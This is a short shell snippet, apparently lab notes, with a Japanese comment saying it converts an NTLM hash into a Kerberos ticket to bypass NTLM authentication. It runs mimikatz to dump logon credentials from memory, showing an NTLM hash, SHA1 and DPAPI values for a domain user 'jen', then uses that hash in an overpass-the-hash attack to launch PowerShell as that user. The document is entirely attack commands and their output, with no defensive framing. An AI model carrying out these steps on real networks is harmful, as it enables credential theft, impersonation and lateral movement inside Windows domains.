```sh
# NTLMハッシュをKerberosチケットに変換してNTLM認証を回避できる

mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords
# Authentication Id : 0 ; 1142030 (00000000:00116d0e)
# Session           : Interactive from 0
# User Name         : jen
# Domain            : CORP
# Logon Server      : DC1
# Logon Time        : 2/27/2023 7:43:20 AM
# SID               : S-1-5-21-1987370270-658905905-1781884369-1124
#         msv :
#          [00000003] Primary
#          * Username : jen
#          * Domain   : CORP
#          * NTLM     : 369def79d8372408bf6e93364cc93075
#          * SHA1     : faf35992ad0df4fc418af543e5f4cb08210830d4
#          * DPAPI    : ed6686fedb60840cd49b5286a7c08fa4
#         tspkg :
#         wdigest :
#          * Username : jen
#          * Domain   : CORP
#          * Password : (null)
#         kerberos :
#          * Username : jen
#          * Domain   : CORP.COM
#          * Password : (null)
#         ssp :
#         credman :

mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell 
user    : jen
domain  : corp.com
program : powershell
impers. : no
NTLM    : 369def79d8372408bf6e93364cc93075
  |  PID  8716
  |  TID  8348
  |  LSA Process is now R/W
  |  LUID 0 ; 16534348 (00000000:00fc4b4c)
  \_ msv1_0   - data copy @ 000001F3D5C69330 : OK !
  \_ kerberos - data copy @ 000001F3D5D366C8
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 000001F3D5C63B68 (32) -> null

```